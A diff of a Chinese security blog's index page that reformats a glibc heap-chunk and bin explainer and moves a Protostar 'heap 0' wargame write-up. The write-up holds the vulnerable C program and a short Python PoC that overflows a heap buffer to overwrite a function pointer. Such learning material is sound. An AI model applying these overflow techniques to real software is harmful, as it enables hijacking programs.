@@ -195,9 +195,10 @@
 <ul>
 <li>allocate chunk</li>
 </ul>
-<figure class="highlight coq"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">chunk   --&gt;+---------------------------------------+</div><div class="line">           |     <span class="type">前一个chunk</span>大小                     |</div><div class="line">           <span class="type">+---------------------------------------+</span></div><div class="line">           |     当前chunk大小                 |<span class="type">A</span>|<span class="type">M</span>|<span class="type">P</span>|</div><div class="line"> <span class="type">mem</span>    --&gt;+---------------------------------------+</div><div class="line">           |     <span class="type">malloc</span>返回用户的开始地址，储存用户数据  |</div><div class="line">           <span class="type">.                                       .</span></div><div class="line">           .                                       .</div><div class="line">           .                                       .</div><div class="line">nextchunk-&gt;+---------------------------------------+</div><div class="line">		    |     <span class="type">前一个chunk</span>大小                     |</div><div class="line">           <span class="type">+---------------------------------------+</span></div><div class="line">                       </div><div class="line">                              </div><div class="line">```   </div><div class="line"></div><div class="line">*  freed chunk</div></pre></td></tr></table></figure>
-<p>chunk   –&gt;+—————————————+<br>           |     前一个chunk大小                     |<br>           +—————————————+<br>           |     当前chunk大小                |A| |P|<br> mem    –&gt;+—————————————+<br>           |     fd指向free list中下一个chunk        |<br>           +—————————————+<br>           |     bk指向free list中后一个chunk        |<br>           +—————————————+<br>           .     用户数据 可能为0                    .<br>           .                                       .<br>nextchunk-&gt;+—————————————+<br>           |     前一个chunk大小                     |<br>           +—————————————+</p>
-<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">    </div><div class="line"><span class="number">3.</span>更多细节</div><div class="line">因为chunk是按照<span class="number">8</span>字节对齐的，所以当前块中的size低三位将用作相关标志，从右到左A M P分别代表：是否在主heap？是否通过mmap()分配？前一个chunk是否在使用？</div><div class="line">然后可以想到有一个最小chunk的存在，其大小为<span class="number">16</span>字节()。</div><div class="line"></div><div class="line"><span class="number">4.</span>特殊chunk</div><div class="line"></div><div class="line">top chunk:指可能内存边界的末端，也被称作wilderness chunk。如果其他bin都不满足malloc的情况下，就会从top chunk里去一部分去满足分配请求，剩余的则作为新的top chunk，并且top chunk不在任何一个bin中。随着被分离和合并top chunk会增大和减小。</div><div class="line"></div><div class="line">last_remainder:和top chunk一样，不在任何一个bin中，但最终可能会合并到一个bin中。可以看英文原文解释：The last_remainder chunk is <span class="keyword">the</span> <span class="built_in">result</span> <span class="keyword">of</span> allocation requests <span class="keyword">for</span> small chunks that have no exact fit <span class="keyword">in</span> <span class="keyword">any</span> <span class="keyword">of</span> <span class="keyword">the</span> bins. If <span class="keyword">the</span> request is larger than <span class="keyword">the</span> last_remainder chunk but smaller than <span class="keyword">a</span> block <span class="keyword">in</span> <span class="keyword">a</span> bin, <span class="keyword">then</span> <span class="keyword">the</span> chunk is <span class="built_in">split</span> again. The last_remainder chunk is <span class="keyword">the</span> <span class="built_in">result</span> <span class="keyword">of</span> having <span class="built_in">to</span> <span class="built_in">split</span> <span class="keyword">a</span> larger chunk <span class="keyword">into</span> <span class="literal">two</span>, <span class="literal">one</span> part <span class="keyword">of</span> <span class="keyword">it</span> is handed out <span class="built_in">from</span> <span class="keyword">the</span> allocation, <span class="keyword">and</span> <span class="keyword">the</span> other because <span class="keyword">the</span> last_remainder chunk.</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">## 0x04 Bin</span></div><div class="line"></div><div class="line">chunk一旦被释放后就会被存储在叫做Bin的链表中，Bin有不同大小的链表，方便与下次查找到最适当的chunk。通常来说有small-bin，large-bin，fast-bin。</div><div class="line"></div><div class="line">这里我主要介绍fsatbin和normalbin</div><div class="line"></div><div class="line">(<span class="number">1</span>)fastbin：是一种单链表bin，不同系统定义了一个最大值，当chunk大小小于等于这个最大值时，就会被释放到fastbin中，正如名字那样，为了更快的free和malloc，这个链表是无序的，是后进先出（LIFO），并且不与其他chunk合并。</div><div class="line"></div><div class="line">(<span class="number">2</span>)normalbin:是一种双向链表bin，当chunk大小大于fastbin的大小时就会被放入这个bin，并且有着各种大小的normalbin(减少碎片)，bin内部的chunk按大小组织起来。释放后会于相邻的chunk合并。</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">## 0x05 free()源代码分析及相关细节</span></div><div class="line"></div><div class="line"></div><div class="line">`free(void *mem)<span class="comment">--&gt;__libc_free(void *mem)`</span></div></pre></td></tr></table></figure>
+<ul>
+<li>freed chunk</li>
+</ul>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">chunk   <span class="comment">--&gt;+---------------------------------------+</span></div><div class="line">           |     前一个chunk大小                     |</div><div class="line">           +<span class="comment">---------------------------------------+</span></div><div class="line">           |     当前chunk大小                |A| |P|</div><div class="line"> mem    <span class="comment">--&gt;+---------------------------------------+</span></div><div class="line">           |     fd指向free list中下一个chunk        |</div><div class="line">           +<span class="comment">---------------------------------------+</span></div><div class="line">           |     bk指向free list中后一个chunk        |</div><div class="line">           +<span class="comment">---------------------------------------+</span></div><div class="line">           .     用户数据 可能为<span class="number">0</span>                    .</div><div class="line">           .                                       .</div><div class="line">nextchunk-&gt;+<span class="comment">---------------------------------------+</span></div><div class="line">           |     前一个chunk大小                     |</div><div class="line">           +<span class="comment">---------------------------------------+</span></div><div class="line">                   </div><div class="line"></div><div class="line"></div><div class="line">```   </div><div class="line"></div><div class="line">    </div><div class="line"><span class="number">3.</span>更多细节</div><div class="line">因为chunk是按照<span class="number">8</span>字节对齐的，所以当前块中的size低三位将用作相关标志，从右到左A M P分别代表：是否在主heap？是否通过mmap()分配？前一个chunk是否在使用？</div><div class="line">然后可以想到有一个最小chunk的存在，其大小为<span class="number">16</span>字节()。</div><div class="line"></div><div class="line"><span class="number">4.</span>特殊chunk</div><div class="line"></div><div class="line">top chunk:指可能内存边界的末端，也被称作wilderness chunk。如果其他bin都不满足malloc的情况下，就会从top chunk里去一部分去满足分配请求，剩余的则作为新的top chunk，并且top chunk不在任何一个bin中。随着被分离和合并top chunk会增大和减小。</div><div class="line"></div><div class="line">last_remainder:和top chunk一样，不在任何一个bin中，但最终可能会合并到一个bin中。可以看英文原文解释：The last_remainder chunk is <span class="keyword">the</span> <span class="built_in">result</span> <span class="keyword">of</span> allocation requests <span class="keyword">for</span> small chunks that have no exact fit <span class="keyword">in</span> <span class="keyword">any</span> <span class="keyword">of</span> <span class="keyword">the</span> bins. If <span class="keyword">the</span> request is larger than <span class="keyword">the</span> last_remainder chunk but smaller than <span class="keyword">a</span> block <span class="keyword">in</span> <span class="keyword">a</span> bin, <span class="keyword">then</span> <span class="keyword">the</span> chunk is <span class="built_in">split</span> again. The last_remainder chunk is <span class="keyword">the</span> <span class="built_in">result</span> <span class="keyword">of</span> having <span class="built_in">to</span> <span class="built_in">split</span> <span class="keyword">a</span> larger chunk <span class="keyword">into</span> <span class="literal">two</span>, <span class="literal">one</span> part <span class="keyword">of</span> <span class="keyword">it</span> is handed out <span class="built_in">from</span> <span class="keyword">the</span> allocation, <span class="keyword">and</span> <span class="keyword">the</span> other because <span class="keyword">the</span> last_remainder chunk.</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">## 0x04 Bin</span></div><div class="line"></div><div class="line">chunk一旦被释放后就会被存储在叫做Bin的链表中，Bin有不同大小的链表，方便与下次查找到最适当的chunk。通常来说有small-bin，large-bin，fast-bin。</div><div class="line"></div><div class="line">这里我主要介绍fsatbin和normalbin</div><div class="line"></div><div class="line">(<span class="number">1</span>)fastbin：是一种单链表bin，不同系统定义了一个最大值，当chunk大小小于等于这个最大值时，就会被释放到fastbin中，正如名字那样，为了更快的free和malloc，这个链表是无序的，是后进先出（LIFO），并且不与其他chunk合并。</div><div class="line"></div><div class="line">(<span class="number">2</span>)normalbin:是一种双向链表bin，当chunk大小大于fastbin的大小时就会被放入这个bin，并且有着各种大小的normalbin(减少碎片)，bin内部的chunk按大小组织起来。释放后会于相邻的chunk合并。</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">## 0x05 free()源代码分析及相关细节</span></div><div class="line"></div><div class="line"></div><div class="line">`free(void *mem)<span class="comment">--&gt;__libc_free(void *mem)`</span></div></pre></td></tr></table></figure>
 <p>void<br>__libc_free (void <em>mem)<br>{<br>  mstate ar_ptr;<br>  mchunkptr p;                          /</em> chunk corresponding to mem */</p>
 <p>  void (<em>hook) (void </em>, const void <em>)<br>    = atomic_forced_read (<strong>free_hook);<br>  if (</strong>builtin_expect (hook != NULL, 0))<br>    {<br>      (</em>hook)(mem, RETURN_ADDRESS (0));<br>      return;<br>    }</p>
 <p>  if (mem == 0)                              /<em> free(0) has no effect </em>/<br>    return;</p>
@@ -540,128 +541,6 @@ if (! have_lock) {
 
 
   
-    <article id="post-Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/">Protostar-堆溢出系列学习-heap 0</a>
-    </h1>
-  
-
-        
-        <a href="2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/" class="archive-article-date">
-  	<time datetime="2017-04-10T03:12:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><p>学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。</p>
-<h2 id="0x01-heap0"><a href="#0x01-heap0" class="headerlink" title="0x01 heap0"></a>0x01 heap0</h2><p><code>C代码</code></p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> data &#123;</div><div class="line">  <span class="keyword">char</span> name[<span class="number">64</span>];</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> fp &#123;</div><div class="line">  <span class="keyword">int</span> (*fp)();</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"level passed\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">nowinner</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"level has not been passed\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">struct</span> data *d;</div><div class="line">  <span class="keyword">struct</span> fp *f;</div><div class="line"></div><div class="line">  d = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> data));</div><div class="line">  f = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> fp));</div><div class="line">  f-&gt;fp = nowinner;</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"data is at %p, fp is at %p\n"</span>, d, f);</div><div class="line"></div><div class="line">  <span class="built_in">strcpy</span>(d-&gt;name, argv[<span class="number">1</span>]);</div><div class="line">  </div><div class="line">  f-&gt;fp();</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h2 id="0x02-简单分析-amp-思考"><a href="#0x02-简单分析-amp-思考" class="headerlink" title="0x02 简单分析&amp;思考"></a>0x02 简单分析&amp;思考</h2><p>先在堆上分配了一个data和fp的结构体，然后使fp指向<code>nowinner</code>函数，然后打印对应分配的堆地址，以及将<code>argv[1]</code>复制到data结构体，最后调用<code>nowinner</code>函数。</p>
-<p>可以知道我们需要去执行<code>winner</code>函数，怎么做到呢？</p>
-<p>由于<code>strcpy</code>没对数据长度进行检查，那我们是否可以利用堆溢出将fp结构体里面的函数指针改为<code>winner</code>函数？Here we go！</p>
-<h2 id="0x03-malloc"><a href="#0x03-malloc" class="headerlink" title="0x03 malloc()"></a>0x03 malloc()</h2><p>在继续分析之前，我们先来简单的介绍一下<code>malloc</code>函数，在这里<code>malloc</code>函数更多是对<code>mmap</code>系统调用函数的一个封装，为什么要封装呢？也就是为什么不直接调用<code>mmap</code>来进行堆分配，原因是为了方便堆的管理，简单的理解可以把堆看做一个很大的内存块。</p>
-<p>那是如何管理堆的呢？见下</p>
-<table>
-<thead>
-<tr>
-<th>堆标志</th>
-<th>分配大小</th>
-<th>malloc返回地址addr</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>00000000</td>
-<td>00000011</td>
-<td>00000000 00000000</td>
-</tr>
-<tr>
-<td>00000000</td>
-<td>00000031</td>
-<td>AAAAAAAA BBBBBBBB</td>
-</tr>
-<tr>
-<td>CCCCCCCC</td>
-<td>DDDDDDDD</td>
-<td>EEEEEEEE FFFFFFFF</td>
-</tr>
-<tr>
-<td>…</td>
-<td>…</td>
-<td>…       …</td>
-</tr>
-<tr>
-<td>00000000</td>
-<td>00000011</td>
-<td>00000000 00000000</td>
-</tr>
-</tbody>
-</table>
-<p>每次分配的时候会额外分配16字节的管理开销，来表示所分配堆的信息。比如可以通过<code>addr-4</code>拿到自身的分配大小从而决定下次分配的选择</p>
-<p><strong>注：分配大小的第一位表示前面的内存块是否在使用</strong></p>
-<h2 id="0x04-调试-amp-hack"><a href="#0x04-调试-amp-hack" class="headerlink" title="0x04 调试&amp;hack"></a>0x04 调试&amp;hack</h2><p>通过前面的分析，我们的目的很明确，需要通过<code>strcpy(d-&gt;name, argv[1]);</code>去重写fp结构体里面的函数指针，使其为<code>winner</code>函数的地址。</p>
-<p>1.利用gdb查看strcpy前后堆的情况<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/0-0.png?raw=true" alt="0-0"><br>我们看到AAAABBBBCCC…分配到了data堆上，如果我们输入更长的数据，就可以将fp的<code>nowinner</code>地址改为<code>winner</code>地址</p>
-<p>2.查看<code>winner</code>地址，重写fp函数指针</p>
-<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) p winner </div><div class="line">$<span class="number">1</span> = &#123;<span class="keyword">void</span> (<span class="keyword">void</span>)&#125; <span class="number">0x8048464</span> &lt;winner&gt;</div></pre></td></tr></table></figure>
-<p>3.PoC Python脚本</p>
-<figure class="highlight golo"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">padding = <span class="string">"A"</span>*<span class="number">64</span> <span class="comment">#填充data</span></div><div class="line">head = <span class="string">"BBBB"</span>  <span class="comment"># not care</span></div><div class="line">head += <span class="string">"CCCC"</span> <span class="comment"># not care</span></div><div class="line">winner = <span class="keyword">struct</span>.pack(<span class="string">"I"</span>, <span class="number">0x8048464</span>) <span class="comment">#将nowinner地址改为winner地址</span></div><div class="line"><span class="keyword">print</span> padding+head+winner</div></pre></td></tr></table></figure>
-<p>4.hack<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/0-1.png?raw=true" alt="0-1"><br>成功执行<code>winner</code>函数!</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Protostar</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">堆溢出</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
     <article id="post-mach-o动态链接/mach-o动态链接" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -817,6 +696,128 @@ if (! have_lock) {
       
         <p class="article-more-link">
           <a class="article-more-a" href="2017/04/10/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/">Protostar-堆溢出系列学习-heap 0</a>
+    </h1>
+  
+
+        
+        <a href="2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/" class="archive-article-date">
+  	<time datetime="2017-04-10T03:12:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><p>学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。</p>
+<h2 id="0x01-heap0"><a href="#0x01-heap0" class="headerlink" title="0x01 heap0"></a>0x01 heap0</h2><p><code>C代码</code></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> data &#123;</div><div class="line">  <span class="keyword">char</span> name[<span class="number">64</span>];</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> fp &#123;</div><div class="line">  <span class="keyword">int</span> (*fp)();</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"level passed\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">nowinner</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"level has not been passed\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">struct</span> data *d;</div><div class="line">  <span class="keyword">struct</span> fp *f;</div><div class="line"></div><div class="line">  d = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> data));</div><div class="line">  f = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> fp));</div><div class="line">  f-&gt;fp = nowinner;</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"data is at %p, fp is at %p\n"</span>, d, f);</div><div class="line"></div><div class="line">  <span class="built_in">strcpy</span>(d-&gt;name, argv[<span class="number">1</span>]);</div><div class="line">  </div><div class="line">  f-&gt;fp();</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="0x02-简单分析-amp-思考"><a href="#0x02-简单分析-amp-思考" class="headerlink" title="0x02 简单分析&amp;思考"></a>0x02 简单分析&amp;思考</h2><p>先在堆上分配了一个data和fp的结构体，然后使fp指向<code>nowinner</code>函数，然后打印对应分配的堆地址，以及将<code>argv[1]</code>复制到data结构体，最后调用<code>nowinner</code>函数。</p>
+<p>可以知道我们需要去执行<code>winner</code>函数，怎么做到呢？</p>
+<p>由于<code>strcpy</code>没对数据长度进行检查，那我们是否可以利用堆溢出将fp结构体里面的函数指针改为<code>winner</code>函数？Here we go！</p>
+<h2 id="0x03-malloc"><a href="#0x03-malloc" class="headerlink" title="0x03 malloc()"></a>0x03 malloc()</h2><p>在继续分析之前，我们先来简单的介绍一下<code>malloc</code>函数，在这里<code>malloc</code>函数更多是对<code>mmap</code>系统调用函数的一个封装，为什么要封装呢？也就是为什么不直接调用<code>mmap</code>来进行堆分配，原因是为了方便堆的管理，简单的理解可以把堆看做一个很大的内存块。</p>
+<p>那是如何管理堆的呢？见下</p>
+<table>
+<thead>
+<tr>
+<th>堆标志</th>
+<th>分配大小</th>
+<th>malloc返回地址addr</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>00000000</td>
+<td>00000011</td>
+<td>00000000 00000000</td>
+</tr>
+<tr>
+<td>00000000</td>
+<td>00000031</td>
+<td>AAAAAAAA BBBBBBBB</td>
+</tr>
+<tr>
+<td>CCCCCCCC</td>
+<td>DDDDDDDD</td>
+<td>EEEEEEEE FFFFFFFF</td>
+</tr>
+<tr>
+<td>…</td>
+<td>…</td>
+<td>…       …</td>
+</tr>
+<tr>
+<td>00000000</td>
+<td>00000011</td>
+<td>00000000 00000000</td>
+</tr>
+</tbody>
+</table>
+<p>每次分配的时候会额外分配16字节的管理开销，来表示所分配堆的信息。比如可以通过<code>addr-4</code>拿到自身的分配大小从而决定下次分配的选择</p>
+<p><strong>注：分配大小的第一位表示前面的内存块是否在使用</strong></p>
+<h2 id="0x04-调试-amp-hack"><a href="#0x04-调试-amp-hack" class="headerlink" title="0x04 调试&amp;hack"></a>0x04 调试&amp;hack</h2><p>通过前面的分析，我们的目的很明确，需要通过<code>strcpy(d-&gt;name, argv[1]);</code>去重写fp结构体里面的函数指针，使其为<code>winner</code>函数的地址。</p>
+<p>1.利用gdb查看strcpy前后堆的情况<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/0-0.png?raw=true" alt="0-0"><br>我们看到AAAABBBBCCC…分配到了data堆上，如果我们输入更长的数据，就可以将fp的<code>nowinner</code>地址改为<code>winner</code>地址</p>
+<p>2.查看<code>winner</code>地址，重写fp函数指针</p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) p winner </div><div class="line">$<span class="number">1</span> = &#123;<span class="keyword">void</span> (<span class="keyword">void</span>)&#125; <span class="number">0x8048464</span> &lt;winner&gt;</div></pre></td></tr></table></figure>
+<p>3.PoC Python脚本</p>
+<figure class="highlight golo"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">padding = <span class="string">"A"</span>*<span class="number">64</span> <span class="comment">#填充data</span></div><div class="line">head = <span class="string">"BBBB"</span>  <span class="comment"># not care</span></div><div class="line">head += <span class="string">"CCCC"</span> <span class="comment"># not care</span></div><div class="line">winner = <span class="keyword">struct</span>.pack(<span class="string">"I"</span>, <span class="number">0x8048464</span>) <span class="comment">#将nowinner地址改为winner地址</span></div><div class="line"><span class="keyword">print</span> padding+head+winner</div></pre></td></tr></table></figure>
+<p>4.hack<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/0-1.png?raw=true" alt="0-1"><br>成功执行<code>winner</code>函数!</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Protostar</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">堆溢出</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/">展开全文 >></a>
         </p>
       
 
@@ -1694,6 +1695,18 @@ if (! have_lock) {
